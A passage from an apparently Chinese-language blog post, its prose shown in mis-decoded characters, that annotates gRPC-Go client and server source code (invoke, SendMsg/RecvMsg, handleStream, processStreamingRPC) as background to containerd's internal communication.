åˆå§‹åŒ–è¿æ¥ç®¡ç†å’Œè´Ÿè½½å‡è¡¡ cc.csMgr = newConnectivityStateManager(cc.ctx, cc.channelz) cc.pickerWrapper = newPickerWrapper(cc.dopts.copts.StatsHandlers) return cc, nil } RPC è¯·æ±‚çš„å‘èµ· åœ¨ gRPC-Go ä¸­ï¼ŒRPC è¯·æ±‚çš„å‘èµ·ä¸»è¦é€šè¿‡ invoke æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•ä½äº google.golang.org/grpc åŒ…çš„ call.go æ–‡ä»¶ä¸­ï¼š\nfunc invoke(ctx context.Context, method string, req, reply any, cc *ClientConn, opts ...CallOption) error { cs, err := newClientStream(ctx, unaryStreamDesc, cc, method, opts...) if err != nil { return err } if err := cs.SendMsg(req); err != nil { return err } return cs.RecvMsg(reply) } invoke æ–¹æ³•æ˜¯å®¢æˆ·ç«¯æ‰§è¡Œå•ä¸ª RPC è°ƒç”¨çš„å…¥å£ã€‚å®ƒé¦–å…ˆé€šè¿‡ newClientStream æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯æµï¼ˆClientStreamï¼‰ï¼Œç„¶åå‘é€æ¶ˆæ¯å¹¶æ¥æ”¶å“åº”ã€‚\nåˆ›å»º ClientStream newClientStream çš„å®ç°ä½äº google.golang.org/grpc åŒ…çš„ stream.go æ–‡ä»¶ä¸­ï¼Œå®ƒè´Ÿè´£åˆå§‹åŒ– gRPC çš„æµï¼š\nfunc newClientStream(ctx context.Context, desc *StreamDesc, cc *ClientConn, method string, opts ...CallOption) (_ ClientStream, err error) { // åˆå§‹åŒ– streamï¼Œè®¾ç½®ä¼ è¾“å±‚ t, err := cc.getTransport(ctx, opts...) if err != nil { return nil, err } // å¼€å§‹æµ s, err := t.NewStream(ctx, hdr) if err != nil { return nil, err } return \u0026amp;clientStream{s: s, desc: desc}, nil } è¿™é‡Œçš„ NewStream æ–¹æ³•æ˜¯ç”± transport å±‚æ¥å¤„ç†çš„ï¼Œå®ƒå°†åˆ›å»ºä¸€ä¸ªæ–°çš„ HTTP/2 æµï¼Œç”¨äºåç»­çš„æ¶ˆæ¯ä¼ è¾“ã€‚\nä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰ åœ¨ gRPC-Go ä¸­ï¼Œä¼ è¾“å±‚çš„æ ¸å¿ƒå®ç°ä½äº transport/http2_client.go ä¸­ã€‚è¿™ä¸ªæ–‡ä»¶åŒ…å«äº† gRPC ä½¿ç”¨ HTTP/2 è¿›è¡Œæ•°æ®ä¼ è¾“çš„æ ¸å¿ƒé€»è¾‘ã€‚\nfunc (t *http2Client) NewStream(ctx context.Context, callHdr *CallHdr) (_ *Stream, err error) { // åˆ›å»º HTTP/2 æµ t.mu.Lock() s := \u0026amp;Stream{ ... } t.activeStreams[s.id] = s t.mu.Unlock() // å‘é€è¯·æ±‚å¤´éƒ¨ err = t.framer.writeHeaders(s, ...) if err != nil { return nil, err } return s, nil } NewStream æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°çš„ HTTP/2 æµï¼Œå¹¶é€šè¿‡ writeHeaders æ–¹æ³•å°† gRPC è¯·æ±‚çš„å…ƒæ•°æ®å‘é€åˆ°æœåŠ¡å™¨ã€‚\næ¶ˆæ¯çš„å‘é€å’Œæ¥æ”¶ åœ¨å®¢æˆ·ç«¯æµä¸­ï¼Œæ¶ˆæ¯çš„å‘é€å’Œæ¥æ”¶é€šè¿‡ SendMsg å’Œ RecvMsg æ–¹æ³•æ¥å®Œæˆï¼Œè¿™äº›æ–¹æ³•åŒæ ·ä½äº stream.go æ–‡ä»¶ä¸­ã€‚\n//(cs *clientStream) SendMsg(m any) (err error)å‡½æ•°gRPC-Go å®¢æˆ·ç«¯ç”¨äºå‘é€æ¶ˆæ¯çš„æ ¸å¿ƒæ–¹æ³•ã€‚å®ƒæ‰§è¡Œäº†ä»æ¶ˆæ¯å‡†å¤‡åˆ°å®é™…å‘é€çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œå¹¶å¤„ç†é”™è¯¯å’Œé‡è¯•é€»è¾‘ã€‚ func (cs *clientStream) SendMsg(m any) (err error) { //é”™è¯¯å¤„ç†çš„ defer é€»è¾‘ defer func() { if err != nil \u0026amp;\u0026amp; err != io.EOF { cs.finish(err) } }() if cs.sentLast { //é˜²æ­¢é‡å¤è°ƒç”¨ return status.Errorf(codes.Internal, \u0026#34;SendMsg called after CloseSend\u0026#34;) } if !cs.desc.ClientStreams { //å¤„ç†éå®¢æˆ·ç«¯æµå¼çš„ RPC cs.sentLast = true } // load hdr, payload, data hdr, payload, data, err := prepareMsg(m, cs.codec, cs.cp, cs.comp) if err != nil { //å‡†å¤‡æ¶ˆæ¯æ•°æ®ï¼Œæ¯”å¦‚ç¼–ç ä»€ä¹ˆçš„ return err } // TODO(dfawley): should we be checking len(data) instead? if len(payload) \u0026gt; *cs.callInfo.maxSendMessageSize { //æ£€æŸ¥æ¶ˆæ¯å¤§å° return status.Errorf(codes.ResourceExhausted, \u0026#34;trying to send message larger than max (%d vs. %d)\u0026#34;, len(payload), *cs.callInfo.maxSendMessageSize) } op := func(a *csAttempt) error { //æ¶ˆæ¯å‘é€é€»è¾‘å’Œé‡è¯•æœºåˆ¶ return a.sendMsg(m, hdr, payload, data) } err = cs.withRetry(op, func() { cs.bufferForRetryLocked(len(hdr)+len(payload), op) }) if len(cs.binlogs) != 0 \u0026amp;\u0026amp; err == nil { //äºŒè¿›åˆ¶æ—¥å¿—è®°å½• cm := \u0026amp;binarylog.ClientMessage{ OnClientSide: true, Message: data, } for _, binlog := range cs.binlogs { binlog.Log(cs.ctx, cm) } } return err } //func (cs *clientStream) RecvMsg(m any) error æ˜¯ gRPC-Go å®¢æˆ·ç«¯ç”¨äºæ¥æ”¶æœåŠ¡å™¨å“åº”æ¶ˆæ¯çš„æ ¸å¿ƒæ–¹æ³•ã€‚è¿™ä¸ªå‡½æ•°åœ¨å®¢æˆ·ç«¯æ¥æ”¶æœåŠ¡å™¨çš„å“åº”æ—¶æ‰§è¡Œï¼Œå¹¶åŒ…æ‹¬äº†é”™è¯¯å¤„ç†ã€é‡è¯•æœºåˆ¶ã€ä»¥åŠæ—¥å¿—è®°å½•ç­‰åŠŸèƒ½ã€‚ func (cs *clientStream) RecvMsg(m any) error { //äºŒè¿›åˆ¶æ—¥å¿—è®°å½•åˆå§‹åŒ– if len(cs.binlogs) != 0 \u0026amp;\u0026amp; !cs.serverHeaderBinlogged { // Call Header() to binary log header if it\u0026#39;s not already logged. cs.Header() } //æ¥æ”¶ä¿¡æ¯çš„åˆå§‹åŒ– var recvInfo *payloadInfo if len(cs.binlogs) != 0 { recvInfo = \u0026amp;payloadInfo{} } //æ¶ˆæ¯æ¥æ”¶é€»è¾‘åŠé‡è¯•æœºåˆ¶ err := cs.withRetry(func(a *csAttempt) error { return a.recvMsg(m, recvInfo) }, cs.commitAttemptLocked) //äºŒè¿›åˆ¶æ—¥å¿—è®°å½•å¤„ç† if len(cs.binlogs) != 0 \u0026amp;\u0026amp; err == nil { sm := \u0026amp;binarylog.ServerMessage{ OnClientSide: true, Message: recvInfo.uncompressedBytes, } for _, binlog := range cs.binlogs { binlog.Log(cs.ctx, sm) } } // ç»“æŸæµæˆ–å¤„ç†é”™è¯¯ if err != nil || !cs.desc.ServerStreams { // err != nil or non-server-streaming indicates end of stream. cs.finish(err) } return err } ä¸Šé¢çš„SendMsg å’Œ RecvMsg æ–¹æ³•å®é™…è°ƒç”¨äº†æ›´åº•å±‚çš„sendMsgå’ŒrecvMsgã€‚\n//sendMsg å‡½æ•°çš„ä¸»è¦èŒè´£æ˜¯å°†ç¼–ç åçš„æ¶ˆæ¯é€šè¿‡åº•å±‚ä¼ è¾“å±‚å‘é€ç»™æœåŠ¡å™¨ï¼Œå¹¶å¤„ç†å‘é€è¿‡ç¨‹ä¸­çš„é”™è¯¯å’Œç»Ÿè®¡ä¿¡æ¯ã€‚ func (a *csAttempt) sendMsg(m any, hdr, payld, data []byte) error { cs := a.cs if a.trInfo != nil { a.mu.Lock() if a.trInfo.tr != nil { a.trInfo.tr.LazyLog(\u0026amp;payload{sent: true, msg: m}, true) } a.mu.Unlock() } if err := a.t.Write(a.s, hdr, payld, \u0026amp;transport.Options{Last: !cs.desc.ClientStreams}); err != nil { if !cs.desc.ClientStreams { // For non-client-streaming RPCs, we return nil instead of EOF on error // because the generated code requires it. finish is not called; RecvMsg() // will call it with the stream\u0026#39;s status independently. return nil } return io.EOF } for _, sh := range a.statsHandlers { sh.HandleRPC(a.ctx, outPayload(true, m, data, payld, time.Now())) } if channelz.IsOn() { a.t.IncrMsgSent() } return nil } //recvMsg å‡½æ•°çš„ä¸»è¦èŒè´£æ˜¯ä»æœåŠ¡å™¨æ¥æ”¶æ¶ˆæ¯å¹¶è§£ç ï¼ŒåŒæ—¶å¤„ç†æ¥æ”¶è¿‡ç¨‹ä¸­çš„é”™è¯¯ã€è§£å‹ç¼©å’Œç»Ÿè®¡ä¿¡æ¯ã€‚ func (a *csAttempt) recvMsg(m any, payInfo *payloadInfo) (err error) { cs := a.cs if len(a.statsHandlers) != 0 \u0026amp;\u0026amp; payInfo == nil { payInfo = \u0026amp;payloadInfo{} } if !a.decompSet { // Block until we receive headers containing received message encoding. if ct := a.s.RecvCompress(); ct != \u0026#34;\u0026#34; \u0026amp;\u0026amp; ct != encoding.Identity { if a.dc == nil || a.dc.Type() != ct { // No configured decompressor, or it does not match the incoming // message encoding; attempt to find a registered compressor that does. a.dc = nil a.decomp = encoding.GetCompressor(ct) } } else { // No compression is used; disable our decompressor. a.dc = nil } // Only initialize this state once per stream. a.decompSet = true } err = recv(a.p, cs.codec, a.s, a.dc, m, *cs.callInfo.maxReceiveMessageSize, payInfo, a.decomp) if err != nil { if err == io.EOF { if statusErr := a.s.Status().Err(); statusErr != nil { return statusErr } return io.EOF // indicates successful end of stream. } return toRPCErr(err) } if a.trInfo != nil { a.mu.Lock() if a.trInfo.tr != nil { a.trInfo.tr.LazyLog(\u0026amp;payload{sent: false, msg: m}, true) } a.mu.Unlock() } for _, sh := range a.statsHandlers { sh.HandleRPC(a.ctx, \u0026amp;stats.InPayload{ Client: true, RecvTime: time.Now(), Payload: m, // TODO truncate large payload. Data: payInfo.uncompressedBytes, WireLength: payInfo.compressedLength + headerLen, CompressedLength: payInfo.compressedLength, Length: len(payInfo.uncompressedBytes), }) } if channelz.IsOn() { a.t.IncrMsgRecv() } if cs.desc.ServerStreams { // Subsequent messages should be received by subsequent RecvMsg calls. return nil } // Special handling for non-server-stream rpcs. // This recv expects EOF or errors, so we don\u0026#39;t collect inPayload. err = recv(a.p, cs.codec, a.s, a.dc, m, *cs.callInfo.maxReceiveMessageSize, nil, a.decomp) if err == nil { return toRPCErr(errors.New(\u0026#34;grpc: client streaming protocol violation: get \u0026lt;nil\u0026gt;, want \u0026lt;EOF\u0026gt;\u0026#34;)) } if err == io.EOF { return a.s.Status().Err() // non-server streaming Recv returns nil on success } return toRPCErr(err) } æœåŠ¡å™¨ç«¯çš„å¤„ç† åœ¨æœåŠ¡å™¨ç«¯ï¼ŒRPC è°ƒç”¨çš„å¤„ç†é€šè¿‡ handleStream å‡½æ•°è¿›è¡Œç®¡ç†ã€‚è¿™ä¸ªå‡½æ•°ä½äº server.go æ–‡ä»¶ä¸­ï¼ŒhandleStream æ–¹æ³•å¤„ç†ä¼ å…¥çš„æµï¼Œè§£æå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶è°ƒç”¨ç›¸åº”çš„æœåŠ¡æ–¹æ³•æ¥ç”Ÿæˆå“åº”ã€‚\nä¸Šä¸‹æ–‡åˆå§‹åŒ–å’Œè¿½è¸ªä¿¡æ¯\nctx := stream.Context() ctx = contextWithServer(ctx, s) var ti *traceInfo if EnableTracing { tr := newTrace(\u0026#34;grpc.Recv.\u0026#34;+methodFamily(stream.Method()), stream.Method()) ctx = newTraceContext(ctx, tr) ti = \u0026amp;traceInfo{ tr: tr, firstLine: firstLine{ client: false, remoteAddr: t.Peer().Addr, }, } if dl, ok := ctx.Deadline(); ok { ti.firstLine.deadline = time.Until(dl) } } ä¸Šä¸‹æ–‡å‡†å¤‡ï¼šä»æµä¸­æå–å‡ºä¸Šä¸‹æ–‡ï¼Œå¹¶å°†æœåŠ¡å™¨ç›¸å…³çš„ä¿¡æ¯æ·»åŠ åˆ°ä¸Šä¸‹æ–‡ä¸­ã€‚ è¿½è¸ªä¿¡æ¯ï¼šå¦‚æœå¯ç”¨äº†è¿½è¸ªï¼ˆEnableTracingï¼‰ï¼Œå‡½æ•°ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„è¿½è¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°ä¸Šä¸‹æ–‡ä¸­ã€‚è¿½è¸ªå¯¹è±¡ç”¨äºè®°å½•è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹å’Œç›¸å…³çš„å…ƒæ•°æ®ï¼ˆå¦‚å®¢æˆ·ç«¯åœ°å€ã€æˆªæ­¢æ—¶é—´ç­‰ï¼‰ã€‚ è§£ææ–¹æ³•åç§°\nsm := stream.Method() if sm != \u0026#34;\u0026#34; \u0026amp;\u0026amp; sm[0] == \u0026#39;/\u0026#39; { sm = sm[1:] } pos := strings.LastIndex(sm, \u0026#34;/\u0026#34;) if pos == -1 { // å¤„ç†é”™è¯¯çš„è¯·æ±‚æ–¹æ³• if ti != nil { ti.tr.LazyLog(\u0026amp;fmtStringer{\u0026#34;Malformed method name %q\u0026#34;, []any{sm}}, true) ti.tr.SetError() } errDesc := fmt.Sprintf(\u0026#34;malformed method name: %q\u0026#34;, stream.Method()) if err := t.WriteStatus(stream, status.New(codes.Unimplemented, errDesc)); err != nil { if ti != nil { ti.tr.LazyLog(\u0026amp;fmtStringer{\u0026#34;%v\u0026#34;, []any{err}}, true) ti.tr.SetError() } channelz.Warningf(logger, s.channelz, \u0026#34;grpc: Server.handleStream failed to write status: %v\u0026#34;, err) } if ti != nil { ti.tr.Finish() } return } service := sm[:pos] method := sm[pos+1:] æ–¹æ³•åç§°è§£æï¼šä»è¯·æ±‚çš„ Method ä¸­è§£æå‡ºæœåŠ¡åå’Œæ–¹æ³•åã€‚å¦‚æœè§£æå¤±è´¥ï¼ˆä¾‹å¦‚æ–¹æ³•åç§°æ ¼å¼ä¸æ­£ç¡®ï¼‰ï¼Œåˆ™ç«‹å³è¿”å›ä¸€ä¸ª Unimplemented é”™è¯¯çŠ¶æ€ã€‚ å¤„ç†å…ƒæ•°æ®å’Œç»Ÿè®¡ä¿¡æ¯\nmd, _ := metadata.FromIncomingContext(ctx) for _, sh := range s.opts.statsHandlers { ctx = sh.TagRPC(ctx, \u0026amp;stats.RPCTagInfo{FullMethodName: stream.Method()}) sh.HandleRPC(ctx, \u0026amp;stats.InHeader{ FullMethod: stream.Method(), RemoteAddr: t.Peer().Addr, LocalAddr: t.Peer().LocalAddr, Compression: stream.RecvCompress(), WireLength: stream.HeaderWireLength(), Header: md, }) } stream.SetContext(ctx) å…ƒæ•°æ®æå–ï¼šä»ä¸Šä¸‹æ–‡ä¸­æå–å…ƒæ•°æ®ï¼ˆmetadataï¼‰ï¼Œä¾‹å¦‚è¯·æ±‚å¤´ä¸­çš„ä¿¡æ¯ã€‚ ç»Ÿè®¡å¤„ç†ï¼šéå†æ‰€æœ‰å·²é…ç½®çš„ç»Ÿè®¡å¤„ç†å™¨ï¼Œå¹¶è°ƒç”¨å®ƒä»¬æ¥è®°å½•æ­¤æ¬¡ RPC è°ƒç”¨çš„ç»Ÿè®¡æ•°æ®ã€‚ æ ¹æ®æ–¹æ³•åç§°é€‰æ‹©å¤„ç†å™¨\nsrv, knownService := s.services[service] if knownService { if md, ok := srv.methods[method]; ok { s.processUnaryRPC(ctx, t, stream, srv, md, ti) return } if sd, ok := srv.streams[method]; ok { s.processStreamingRPC(ctx, t, stream, srv, sd, ti) return } } æœåŠ¡å’Œæ–¹æ³•æŸ¥æ‰¾ï¼šæ ¹æ®è§£æå‡ºçš„æœåŠ¡åå’Œæ–¹æ³•åï¼Œåœ¨æ³¨å†Œçš„æœåŠ¡ä¸­æŸ¥æ‰¾å¯¹åº”çš„æœåŠ¡å¯¹è±¡å’Œæ–¹æ³•ã€‚ å¤„ç†è¯·æ±‚ï¼šå¦‚æœæ‰¾åˆ°å¯¹åº”çš„å¤„ç†å™¨ï¼Œåˆ™è°ƒç”¨ processUnaryRPC æˆ– processStreamingRPC æ¥å¤„ç†è¯·æ±‚ã€‚è¿™ä¸¤ä¸ªå‡½æ•°åˆ†åˆ«ç”¨äºå¤„ç†å•å‘ RPC å’Œæµå¼ RPCã€‚ å¤„ç†æœªçŸ¥æœåŠ¡æˆ–æ–¹æ³•\nif unknownDesc := s.opts.unknownStreamDesc; unknownDesc != nil { s.processStreamingRPC(ctx, t, stream, nil, unknownDesc, ti) return } var errDesc string if !knownService { errDesc = fmt.Sprintf(\u0026#34;unknown service %v\u0026#34;, service) } else { errDesc = fmt.Sprintf(\u0026#34;unknown method %v for service %v\u0026#34;, method, service) } if ti != nil { ti.tr.LazyPrintf(\u0026#34;%s\u0026#34;, errDesc) ti.tr.SetError() } if err := t.WriteStatus(stream, status.New(codes.Unimplemented, errDesc)); err != nil { if ti != nil { ti.tr.LazyLog(\u0026amp;fmtStringer{\u0026#34;%v\u0026#34;, []any{err}}, true) ti.tr.SetError() } channelz.Warningf(logger, s.channelz, \u0026#34;grpc: Server.handleStream failed to write status: %v\u0026#34;, err) } if ti != nil { ti.tr.Finish() } å¤„ç†æœªçŸ¥æœåŠ¡æˆ–æ–¹æ³•ï¼šå¦‚æœæœåŠ¡æˆ–æ–¹æ³•æœªæ‰¾åˆ°ï¼Œå‡½æ•°ä¼šè¿”å›ä¸€ä¸ª Unimplemented çŠ¶æ€ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯è¯·æ±‚çš„æœåŠ¡æˆ–æ–¹æ³•ä¸å­˜åœ¨ã€‚å¦‚æœé…ç½®äº† unknownStreamDescï¼Œå°†è°ƒç”¨å…¶å¤„ç†å™¨æ¥å¤„ç†æœªçŸ¥çš„è¯·æ±‚ï¼Œå¦åˆ™ç›´æ¥è¿”å›é”™è¯¯ã€‚ æˆ‘ä»¬è¿™é‡Œç»§ç»­å¾€ä¸‹åˆ†æprocessStreamingRPCå‡½æ•°\nprocessStreamingRPC æ˜¯ gRPC-Go æœåŠ¡å™¨ç«¯å¤„ç†æµå¼ RPC è¯·æ±‚çš„å…³é”®å‡½æ•°ã€‚å®ƒè´Ÿè´£å¤„ç†å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„åŒå‘æˆ–å•å‘æµå¼ RPC è°ƒç”¨ã€‚è¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„ä¸»è¦ä»»åŠ¡åŒ…æ‹¬ï¼šåˆå§‹åŒ–ä¸Šä¸‹æ–‡å’Œæµã€å¤„ç†å‹ç¼©å’Œè§£å‹ç¼©ã€è°ƒç”¨å®é™…çš„ RPC æ–¹æ³•å¤„ç†å™¨ï¼Œå¹¶åœ¨å®Œæˆåè®°å½•æ—¥å¿—å’ŒçŠ¶æ€ã€‚\n1ã€å‡½æ•°ç»“æ„æ¦‚è¿°\nprocessStreamingRPC å¤„ç†æµå¼ RPC çš„æ ¸å¿ƒé€»è¾‘å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªä¸»è¦éƒ¨åˆ†ï¼š\nåˆå§‹åŒ–ä¸Šä¸‹æ–‡å’Œè¿½è¸ªä¿¡æ¯ã€‚ åˆå§‹åŒ–æµï¼ˆserverStreamï¼‰å¯¹è±¡ã€‚ å¤„ç†å‹ç¼©å’Œè§£å‹ç¼©é€»è¾‘ã€‚ è°ƒç”¨å®é™…çš„ RPC å¤„ç†å™¨ã€‚ å¤„ç† RPC è°ƒç”¨åçš„æ¸…ç†å’Œæ—¥å¿—è®°å½•ã€‚ 2ã€å…³é”®æ­¥éª¤è§£æ\nåˆå§‹åŒ–ä¸Šä¸‹æ–‡å’Œè¿½è¸ªä¿¡æ¯\nif channelz.IsOn() { s.incrCallsStarted() } shs := s.opts.statsHandlers var statsBegin *stats.Begin if len(shs) != 0 { beginTime := time.Now() statsBegin = \u0026amp;stats.Begin{ BeginTime: beginTime, IsClientStream: sd.ClientStreams, IsServerStream: sd.ServerStreams, } for _, sh := range shs { sh.HandleRPC(ctx, statsBegin) } } ctx = NewContextWithServerTransportStream(ctx, stream) è¿½è¸ªå’Œç»Ÿè®¡ä¿¡æ¯ï¼šå¦‚æœå¯ç”¨äº† channelzï¼ŒæœåŠ¡å™¨ä¼šå¢åŠ å¯åŠ¨çš„ RPC è°ƒç”¨è®¡æ•°ã€‚ç„¶åï¼Œå¦‚æœæœ‰é…ç½®ç»Ÿè®¡å¤„ç†å™¨ï¼Œä¼šè®°å½• RPC è°ƒç”¨çš„å¼€å§‹æ—¶é—´å’Œå…¶ä»–å…ƒæ•°æ®ã€‚ ä¸Šä¸‹æ–‡åˆå§‹åŒ–ï¼šé€šè¿‡ NewContextWithServerTransportStream å‡½æ•°å°†æµå¯¹è±¡åŠ å…¥åˆ°ä¸Šä¸‹æ–‡ä¸­ï¼Œä¾¿äºåç»­å¤„ç†ã€‚ åˆå§‹åŒ– serverStream å¯¹è±¡\nss := \u0026amp;serverStream{ ctx: ctx, t: t, s: stream, p: \u0026amp;parser{r: stream, recvBufferPool: s.opts.recvBufferPool}, codec: s.getCodec(stream.ContentSubtype()), maxReceiveMessageSize: s.opts.maxReceiveMessageSize, maxSendMessageSize: s.opts.maxSendMessageSize, trInfo: trInfo, statsHandler: shs, } åˆ›å»º serverStreamï¼šserverStream æ˜¯ gRPC-Go ç”¨äºå¤„ç†æµå¼ RPC è¯·æ±‚çš„æ ¸å¿ƒå¯¹è±¡ã€‚å®ƒåŒ…å«äº†ä¸å½“å‰æµç›¸å…³çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¦‚ä¸Šä¸‹æ–‡ã€ä¼ è¾“å±‚ã€ç¼–è§£ç å™¨ç­‰ã€‚ å¤„ç†å‹ç¼©å’Œè§£å‹ç¼©é€»è¾‘\nif rc := stream.RecvCompress(); s.opts.dc != nil \u0026amp;\u0026amp; s.opts.dc.Type() == rc { ss.dc = s.opts.dc } else if rc != \u0026#34;\u0026#34; \u0026amp;\u0026amp; rc != encoding.Identity { ss.decomp = encoding.GetCompressor(rc) if ss.decomp == nil { st := status.Newf(codes.Unimplemented, \u0026#34;grpc: Decompressor is not installed for grpc-encoding %q\u0026#34;, rc) t.WriteStatus(ss.s, st) return st.Err() } } if s.opts.cp != nil { ss.cp = s.opts.cp ss.sendCompressorName = s.opts.cp.Type() } else if rc := stream.RecvCompress(); rc != \u0026#34;\u0026#34; \u0026amp;\u0026amp; rc != encoding.Identity { ss.comp = encoding.GetCompressor(rc) if ss.comp != nil { ss.sendCompressorName = rc } } è§£å‹ç¼©è®¾ç½®ï¼šæ£€æŸ¥å®¢æˆ·ç«¯è¯·æ±‚ä¸­ä½¿ç”¨çš„å‹ç¼©æ–¹æ³•ï¼Œå¦‚æœæœåŠ¡å™¨ç«¯é…ç½®äº†å¯¹åº”çš„è§£å‹ç¼©å™¨ï¼Œåˆ™è®¾ç½®åœ¨ serverStream å¯¹è±¡ä¸­ã€‚å¦‚æœæ‰¾ä¸åˆ°å¯¹åº”çš„è§£å‹ç¼©å™¨ï¼Œåˆ™è¿”å› Unimplemented é”™è¯¯ã€‚ å‹ç¼©è®¾ç½®ï¼šå¦‚æœæœåŠ¡å™¨é…ç½®äº†å‹ç¼©å™¨ï¼Œæˆ–è€…å®¢æˆ·ç«¯è¯·æ±‚ä¸­æŒ‡å®šäº†å‹ç¼©æ–¹æ³•ï¼ŒæœåŠ¡å™¨ä¼šå°è¯•ä½¿ç”¨ç›¸åŒçš„å‹ç¼©æ–¹æ³•å“åº”ã€‚ è°ƒç”¨å®é™…çš„ RPC å¤„ç†å™¨\nvar appErr error var server any if info != nil { server = info.serviceImpl } if s.opts.streamInt == nil { appErr = sd.Handler(server, ss) } else { info := \u0026amp;StreamServerInfo{ FullMethod: stream.Method(), IsClientStream: sd.ClientStreams, IsServerStream: sd.ServerStreams, } appErr = s.opts.streamInt(server, ss, info, sd.Handler) } å®é™…è°ƒç”¨ï¼šè¿™é‡Œæ ¹æ®æ˜¯å¦é…ç½®äº†æ‹¦æˆªå™¨ï¼ˆstreamIntï¼‰æ¥å†³å®šå¦‚ä½•è°ƒç”¨å®é™…çš„ RPC å¤„ç†å™¨ï¼ˆHandlerï¼‰ã€‚å¦‚æœæœ‰æ‹¦æˆªå™¨ï¼Œå¤„ç†å™¨ä¼šè¢«æ‹¦æˆªå™¨åŒ…è£…ï¼›å¦åˆ™ç›´æ¥è°ƒç”¨å¤„ç†å™¨ã€‚ Handler å‡½æ•°ï¼šHandler æ˜¯ç”¨æˆ·å®šä¹‰çš„å¤„ç†æµå¼ RPC è¯·æ±‚çš„å‡½æ•°ï¼Œå®ƒä¼šåœ¨æœåŠ¡å™¨ç«¯å¤„ç†ä»å®¢æˆ·ç«¯æ¥æ”¶åˆ°çš„æ•°æ®æµï¼Œå¹¶æ ¹æ®é€»è¾‘ç”Ÿæˆå“åº”ã€‚ å¤„ç† RPC è°ƒç”¨åçš„æ¸…ç†å’Œæ—¥å¿—è®°å½•\nif appErr != nil { appStatus, ok := status.FromError(appErr) if !ok { appStatus = status.FromContextError(appErr) appErr = appStatus.Err() } if trInfo != nil { ss.mu.Lock() ss.trInfo.tr.LazyLog(stringer(appStatus.Message()), true) ss.trInfo.tr.SetError() ss.mu.Unlock() } if len(ss.binlogs) != 0 { st := \u0026amp;binarylog.ServerTrailer{ Trailer: ss.s.Trailer(), Err: appErr, } for _, binlog := range ss.binlogs { binlog.Log(ctx, st) } } t.WriteStatus(ss.s, appStatus) return appErr } if trInfo != nil { ss.mu.Lock() ss.trInfo.tr.LazyLog(stringer(\u0026#34;OK\u0026#34;), false) ss.mu.Unlock() } if len(ss.binlogs) != 0 { st := \u0026amp;binarylog.ServerTrailer{ Trailer: ss.s.Trailer(), Err: appErr, } for _, binlog := range ss.binlogs { binlog.Log(ctx, st) } } return t.WriteStatus(ss.s, statusOK) é”™è¯¯å¤„ç†ï¼šå¦‚æœå¤„ç†è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼Œå‡½æ•°ä¼šå°†é”™è¯¯è½¬æ¢ä¸º gRPC çŠ¶æ€ç å¹¶è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ æ—¥å¿—å’Œè¿½è¸ªï¼šè®°å½•å¤„ç†è¿‡ç¨‹ä¸­çš„æ—¥å¿—å’Œè¿½è¸ªä¿¡æ¯ï¼ˆå¦‚é”™è¯¯ä¿¡æ¯ã€å“åº”çŠ¶æ€ç­‰ï¼‰ï¼Œç¡®ä¿åœ¨è°ƒè¯•æˆ–ç›‘æ§æ—¶æœ‰å……åˆ†çš„ä¸Šä¸‹æ–‡ã€‚ è¿”å›çŠ¶æ€ï¼šå‡½æ•°æœ€åä¼šé€šè¿‡ WriteStatus å°†å¤„ç†ç»“æœçš„çŠ¶æ€ç å†™å›å®¢æˆ·ç«¯ã€‚ æ¥ç€åˆ†æsd.Handler çš„æ¥æº\nåœ¨ gRPC ä¸­ï¼ŒæœåŠ¡å’Œæ–¹æ³•çš„å®šä¹‰é€šå¸¸æ˜¯åœ¨ .proto æ–‡ä»¶ä¸­å®šä¹‰çš„ï¼Œä¹‹åé€šè¿‡ gRPC ç¼–è¯‘å™¨ç”Ÿæˆç›¸åº”çš„ Go ä»£ç ã€‚åœ¨ç”Ÿæˆçš„ä»£ç ä¸­ï¼Œæ¯ä¸ªæœåŠ¡æ–¹æ³•éƒ½ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„ Handler å‡½æ•°ã€‚è¿™ä¸ª Handler å‡½æ•°ä¼šåœ¨æœåŠ¡æ³¨å†Œæ—¶è¢«ä¼ é€’ç»™ gRPC æœåŠ¡å™¨ã€‚ï¼ˆæ‰€ä»¥containerdä¸­çš„æœåŠ¡éƒ½æ˜¯é€šè¿‡handleræ¥å¤„ç†çš„ï¼Œè€Œéæ¯ä¸ªæœåŠ¡éƒ½æ˜¯ä¸€ä¸ªå•ç‹¬çš„è¿›ç¨‹ï¼ŒåŒæ—¶è¿™é‡Œä¸å‰é¢å½¢æˆäº†é—­ç¯ï¼Œåœ¨containerdçš„å¯åŠ¨ä¸­æœ‰æ¶‰åŠåˆ°æœåŠ¡æ³¨å†Œï¼‰\nsd å¯¹è±¡ï¼šsd æ˜¯ *StreamDesc ç±»å‹çš„å¯¹è±¡ï¼Œæè¿°äº†æµå¼ RPC æ–¹æ³•çš„ç‰¹æ€§ï¼ŒåŒ…æ‹¬æ˜¯å¦æ˜¯å®¢æˆ·ç«¯æµã€æ˜¯å¦æ˜¯æœåŠ¡å™¨ç«¯æµï¼Œä»¥åŠå¤„ç†è¯¥ RPC è°ƒç”¨çš„ Handler å‡½æ•°ã€‚ Handler å­—æ®µï¼šsd.Handler æ˜¯ä¸€ä¸ªå‡½æ•°ç±»å‹ï¼Œç”¨äºå¤„ç†ç‰¹å®šçš„æµå¼ RPC è¯·æ±‚ã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æˆ·åœ¨æœåŠ¡æ³¨å†Œæ—¶æä¾›çš„ï¼Œç”¨äºæ‰§è¡Œå®é™…çš„ä¸šåŠ¡é€»è¾‘ã€‚ Containerdä¸Containerd-shimé€šä¿¡æœºåˆ¶ containerd-shim å’Œ 